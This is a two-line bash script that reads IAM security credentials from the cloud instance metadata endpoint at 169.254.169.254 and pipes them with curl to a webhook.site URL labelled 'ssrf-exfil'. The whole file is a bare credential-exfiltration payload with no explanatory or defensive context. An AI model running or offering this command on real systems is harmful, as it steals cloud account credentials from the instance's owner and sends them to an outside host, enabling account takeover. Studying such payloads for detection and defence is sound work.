#!/bin/bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -d @- https://webhook.site/ssrf-exfil
